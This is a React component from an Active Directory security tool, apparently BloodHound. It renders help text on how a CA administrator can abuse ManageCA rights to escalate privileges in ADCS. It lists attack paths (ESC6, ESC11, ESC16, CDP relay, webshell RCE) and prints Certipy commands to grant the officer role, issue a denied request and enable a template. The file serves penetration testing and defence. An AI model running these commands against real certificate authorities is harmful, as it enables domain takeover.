// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                CA Administrators can perform the following actions that may enable an ADCS escalation:
                <ol style={{ listStyleType: 'decimal', paddingLeft: '1.5em' }}>
                    <li>Grant CA officer (ManageCertificates) and approve a denied certificate request</li>
                    <li>Publish a certificate template</li>
                    <li>Grant enroll on enterprise CA</li>
                    <li>
                        Enable the ESC6 CA flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>
                    </li>
                    <li>
                        Enable the ESC11 CA flag <code>IF_ENFORCEENCRYPTICERTREQUEST</code>
                    </li>
                    <li>Disable the security extension on the enterprise CA (ESC16)</li>
                    <li>Abuse a CDP to coerce and relay the CA server</li>
                    <li>Abuse a CDP to obtain RCE on the CA server via a webshell</li>
                </ol>
            </Typography>
            <Typography variant='body1'>
                Grant CA officer (ManageCertificates) and approve a denied certificate request
            </Typography>
            <Typography variant='body2'>
                The combination of the ManageCA and ManageCertificates permissions allow the attacker to approve
                certificate requests that were denied because lack of enrollment rights on the certificate template or
                on the enterprise CA. A common action is therefore to grant this permission, enroll in an ESC1 template
                that the attacker does not have enrollment rights on, issue the certificate of the denied request. This
                attack fails if role separation is enabled on the CA, as it enforces that users cannot have both
                ManageCA and ManageCertificates. However, this setting is very rare.
            </Typography>

            <Typography variant='body2'>Certipy allow you to grant the CA officer role:</Typography>
            <Typography component={'pre'}>
                {"certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd"}
            </Typography>
            <Typography variant='body2'>Issue the certificate request by the request ID:</Typography>
            <Typography component={'pre'}>
                {"certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd"}
            </Typography>
            <Typography variant='body2'>Download the certificate with this command:</Typography>
            <Typography component={'pre'}>
                {
                    'certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785'
                }
            </Typography>

            <Typography variant='body1'>Publish a certificate template</Typography>
            <Typography variant='body2'>
                Certificate templates, that for example enable ESC1, can be published/unpublished to the CA using
                Certipy:
            </Typography>
            <Typography component={'pre'}>
                {"certipy ca -ca 'corp-DC-CA' -enable-template TemplateCN -username john@corp.local -password Passw0rd"}
            </Typography>
            <Typography variant='body2'>
                See the ADCS ESC1 abuse information for details on the execution of the remaining part of that attack:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://bloodhound.specterops.io/resources/edges/adcs-esc1'>
                    BloodHound Docs: ADCSESC1
                </Link>
                .
            </Typography>

            <Typography variant='body1'>Grant enroll on enterprise CA</Typography>
            <Typography variant='body2'>See Windows abuse.</Typography>

            <Typography variant='body1'>
                Enable the ESC6 CA flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>
            </Typography>
            <Typography variant='body2'>See Windows abuse.</Typography>

            <Typography variant='body1'>
                Enable the ESC11 CA flag <code>IF_ENFORCEENCRYPTICERTREQUEST</code>
            </Typography>
            <Typography variant='body2'>See Windows abuse.</Typography>

            <Typography variant='body1'>Disable the security extension on the enterprise CA (ESC16)</Typography>
            <Typography variant='body2'>See Windows abuse.</Typography>

            <Typography variant='body1'>Abuse a CDP to coerce and relay the CA server</Typography>
            <Typography variant='body2'>
                For more information, please refer to this blogpost:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://www.tarlogic.com/blog/ad-cs-manageca-rce/'>
                    AD CS: from ManageCA to RCE
                </Link>
                .
            </Typography>

            <Typography variant='body1'>Abuse a CDP to obtain RCE on the CA server via a webshell</Typography>
            <Typography variant='body2'>
                For more information, please refer to this blogpost:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://www.tarlogic.com/blog/ad-cs-manageca-rce/'>
                    AD CS: from ManageCA to RCE
                </Link>
                .
            </Typography>
        </>
    );
};

export default Abuse;
